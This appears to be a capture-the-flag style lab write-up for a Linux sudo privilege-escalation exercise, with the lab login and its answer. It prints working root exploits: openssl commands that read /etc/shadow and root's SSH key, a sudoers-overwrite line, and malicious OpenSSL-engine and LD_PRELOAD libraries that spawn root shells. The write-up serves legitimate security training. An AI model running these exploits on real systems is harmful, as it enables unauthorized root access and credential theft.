# Section 9 — Sudo Rights Abuse

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — command htb-student can run as root | **`/usr/bin/openssl`** |

`sudo -l` → `(root) NOPASSWD: /usr/bin/openssl`. **Bonus:** Defaults line has `env_keep+=LD_PRELOAD` → a second, generic root path.

---

## Step 1 — Always run `sudo -l`

```bash
sudo -l                      # NOPASSWD entries show even without our password
echo 'PW' | sudo -S -l       # if password needed (non-interactive)
sudo -V | head -1            # sudo version -> CVE-2021-3156 / CVE-2019-14287 / CVE-2023-22809
```
> Read the **Defaults** line too, not just the command list: `env_keep+=LD_PRELOAD`/`LD_LIBRARY_PATH`, missing `secure_path`, `!requiretty`, `NOEXEC` absence — each is its own vector. Here: `NOPASSWD: /usr/bin/openssl` **and** `env_keep+=LD_PRELOAD`.

---

## Step 2 — Exploit the allowed binary (GTFOBins → Sudo)

Look the binary up on **gtfobins.github.io** under **Sudo**. For **`openssl`** (this box):

```bash
# A) read any root-only file (e.g. shadow) as root:
sudo /usr/bin/openssl enc -in /etc/shadow            # prints /etc/shadow -> crack
sudo /usr/bin/openssl enc -in /root/.ssh/id_rsa

# B) write/overwrite any file as root (add ourselves to sudoers / drop SSH key):
echo 'htb-student ALL=(ALL) NOPASSWD:ALL' | sudo /usr/bin/openssl enc -out /etc/sudoers.d/pwn
sudo -l    # now (ALL) NOPASSWD:ALL  -> sudo su -

# C) full RCE via a malicious OpenSSL engine (compile .so, load it as root):
cat > /tmp/x.c <<'EOF'
#include <openssl/engine.h>
#include <stdlib.h>
static int bind(ENGINE *e,const char *id){ setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
EOF
gcc -fPIC -o /tmp/x.o -c /tmp/x.c -I/usr/include
gcc -shared -o /tmp/x.so /tmp/x.o -lcrypto
sudo /usr/bin/openssl req -engine /tmp/x.so          # -> root shell
```
> The section's parallel example: `sudo tcpdump -z postrotate-command` → run a script as root. Pattern is universal — **any sudo-allowed binary with a file-read/file-write/command-exec feature = root**. `openssl` gives all three (`enc -in` read, `enc -out` write, `-engine` RCE).

---

## Step 3 — Bonus vector: `env_keep+=LD_PRELOAD`

When `LD_PRELOAD` is preserved across sudo and you can run **any** command with sudo:

```bash
cat > /tmp/pre.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pre.so /tmp/pre.c
sudo LD_PRELOAD=/tmp/pre.so /usr/bin/openssl          # any sudo-allowed cmd -> root shell
```
> `env_keep+=LD_PRELOAD` means our library loads into the **root** sudo process; `_init()` runs before the real binary → instant root. (Also try `LD_LIBRARY_PATH` if kept.) This works regardless of *which* binary is allowed — only needs one NOPASSWD entry.

---

## Other classic sudo abuses

| Sudoers entry | Abuse |
|---------------|-------|
| `(ALL) NOPASSWD: ALL` | `sudo su -` |
| relative path (`cat` not `/bin/cat`) | PATH abuse (§5): plant malicious `cat` |
| `(ALL, !root)` w/ sudo < 1.8.28 | CVE-2019-14287: `sudo -u#-1 cmd` → root |
| any vim/find/awk/less/python/tar/nmap | GTFOBins Sudo shell escape |
| `LD_PRELOAD`/`LD_LIBRARY_PATH` kept | malicious .so (above) |
| sudo 1.8.2–1.8.31p2 / 1.9.0–1.9.5p1 | CVE-2021-3156 Baron Samedit (heap, no config needed) |

---

## Exam / Engagement Notes

- **`sudo -l` is the #1 privesc check** — NOPASSWD entries need no password to *list*.
- Every allowed binary → gtfobins.github.io `#+sudo`. `openssl` = read+write+RCE as root.
- Read the **Defaults** for `env_keep`/missing `secure_path` — `LD_PRELOAD` kept = generic root with any one entry.
- Quick wins to memorise: openssl (enc/-engine), tcpdump (-z), vim/nano/less/man/awk/find/python/tar/nmap, apache2 (`-f`), wget (`--post-file`/`-i`), git, env, ssh (ProxyCommand).
- If allowed binary is benign, check **sudo version** for Baron Samedit / `-u#-1`.
- Best-practice note for reports: absolute paths in sudoers, no `env_keep` of loader vars, least privilege.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. echo 'Academy_LLPE!' | sudo -S -l
   -> (root) NOPASSWD: /usr/bin/openssl   ; Defaults env_keep+=LD_PRELOAD
3. Q1 = /usr/bin/openssl    ✅
   root: sudo openssl enc -in /etc/shadow   (or -engine .so / LD_PRELOAD .so)
```

> One line: `sudo -l` → take the allowed binary to GTFOBins (openssl = file read/write/RCE as root); and `env_keep+=LD_PRELOAD` is a one-`.so` root regardless of the binary.
